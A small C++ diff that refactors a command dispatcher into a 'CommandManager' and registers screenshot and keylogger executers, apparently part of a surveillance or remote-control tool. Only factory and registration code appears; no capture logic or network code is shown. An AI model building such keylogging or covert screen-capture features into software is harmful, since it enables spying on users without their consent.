@@ -7,7 +7,6 @@
 command::ICommandExecuter*
 utils::builders::BuildScreenshotExecuter()
 {
-
     return ( new command::ScreenshotExecuter(1, "screenshot") );
 }
 
@@ -17,13 +16,16 @@ utils::builders::BuildKeyloggerExecuter()
     return ( new command::KeyloggerExecuter(2, "keylogger") );
 }
 
-command::CommandDispatcher*
-utils::builders::BuildDispatcher()
+command::CommandManager*
+utils::builders::BuildManager()
 {
-    command::CommandDispatcher *dispatcher = new command::CommandDispatcher();
+    command::CommandManager *dispatcher = new command::CommandManager();
+
+    command::ICommandExecuter* a = dispatcher->Find(0);
 
     dispatcher->Add(BuildScreenshotExecuter());
     dispatcher->Add(BuildKeyloggerExecuter());
+
 
     return ( dispatcher );
 }
